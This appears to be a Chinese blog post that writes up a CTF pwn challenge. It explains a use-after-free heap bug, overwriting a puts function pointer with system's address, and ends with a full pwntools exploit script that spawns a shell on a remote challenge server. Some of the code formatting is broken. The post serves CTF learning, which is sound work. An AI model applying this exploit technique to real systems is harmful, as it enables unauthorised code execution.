---
title: 某群CTF
date: 2018-03-18 20:28:10
tags: PWN

---

## 0x00 前言

sw师傅出的入群题

一道UAF技术的简单利用，漏洞原理可以参考如下几篇文章：

<!--more-->

[http://d0m021ng.github.io/2017/03/04/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BUse-after-free%E5%AE%9E%E4%BE%8B/](http://d0m021ng.github.io/2017/03/04/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BUse-after-free%E5%AE%9E%E4%BE%8B/)

https://www.anquanke.com/post/id/85281

http://0x48.pw/2017/07/25/0x35/

http://www.freebuf.com/articles/system/104144.html

http://www.freebuf.com/articles/security-management/105285.html

## 0x01 漏洞分析

这种一般就是堆漏洞了

{%asset_img 0.png%}

删除函数这里free完之后没有置空

{%asset_img 1.png%}

再来分析一下添加函数：

{%asset_img 4.png%}

puts_0函数会返回调用puts函数

{%asset_img 3.png%}



gdb挂上开始调试吧，这里推荐下libheap插件，分析堆很方便

这里先申请一个大于16字节的size

{%asset_img 2.png%}

可以发现这里和之前静态分析的一样，申请了两个chunk

查看一下内容

{%asset_img 5.png%}

第一个chunk存放的是0x0804864以及0x09921018

可以发现0x0804864正好就是指向Puts函数，0x09921018则指向了第二个和之前静态分析吻合,

{%asset_img 6.png%}

那么利用点就在这个指向Puts函数的指针，将其改为system函数之后就能利用它getshell

接下来再创建一个24size的note

{%asset_img 7.png%}

然后释放第一个note,可以发现根据大小系统依次将两个堆块放到相对应的fastbin单链表中

{%asset_img 8.png%}

继续释放第二个note（emmm这里一下不小心操作失误去释放了了一下一个不存在的chunk，然后又重新操作了一边，地址又对不上了。。。，问题不大，能看懂就好）

{%asset_img 9.png%}

然后，这个时候再申请一个大小为16字节以内的note，得到的将是之前第一个note中第一个chunk的堆空间

{%asset_img 10.png%}

看一下内容：

{%asset_img 11.png%}

可以看到，那个指向Puts函数的指针以及被我们改掉了（这里为什么修改的是第一个chunk而不是第二个chunk呢？这就和你申请的大小有关，你后来申请了一个长度小于16size的note,那么自然会从第一条fastbins链中取，堆漏洞利用中，对于大小是很讲究的）

那么思路就是将那个指向Puts函数的指针改为system函数，这样print note时就能调用system函数

{%asset_img 12.png%}

但是现在并不知道system函数的地址，libc版本也没给，之前sw师傅在群里也说了不用leak，那么就猜应该有system的.got地址，搜一下，还真的有

{%asset_img 13.png%}

那么就可以先利用Puts函数打印出system函数，然后再将system函数地址覆盖Puts函数指针，然后再print note一下就能调用system函数从而getshell了

还有一个小问题，就是当从print_note去调用system函数时，参数里会包括system函数本身

{%asset_img 14.png%}

也就是会出现这种情况：

`system(system_addr+参数)`

那么这里有个小技巧（网上查的）

`system(system+';/sh')`

这样就行了

## 0x02 exp编写

```
from pwn import *
import sys
context.log_level = "debug"
puts_addr = 0x0804864b
def Send(data):

p.recvuntil(":")
p.sendline(str(data))

def Add(size,content):

p.recvuntil(":")
p.sendline("1")
p.recvuntil(":")
p.sendline(str(size))
p.recvuntil(":")
p.sendline(content)

def Free(Index):

p.recvuntil(":")
p.sendline("2")
p.recvuntil(":")
p.sendline(str(Index))

def Show(Index):

p.recvuntil(":")
p.sendline("3")
p.recvuntil("Index :")

if name == "main":

# p = process('./backdoor')

    p = remote('p007.cc',7777)

    elf = ELF('./backdoor')

    system_got = elf.got['system']

    Add(24,"1"*23)
    Add(24,"2"*23)
    Free(0)
    Free(1)
    payload = p32(puts_addr) + p32(system_got)
    Add(8,payload)
    Show(0)
    system_addr = u32(p.recv(4))

    log.success('system_addr: '+ hex(system_addr))
    Free(2)
    payload = p32(system_addr)+';sh'
    Add(8,payload)
    Show(0);
    p.interactive()
```

运行之后getshell

{%asset_img 15.png%}





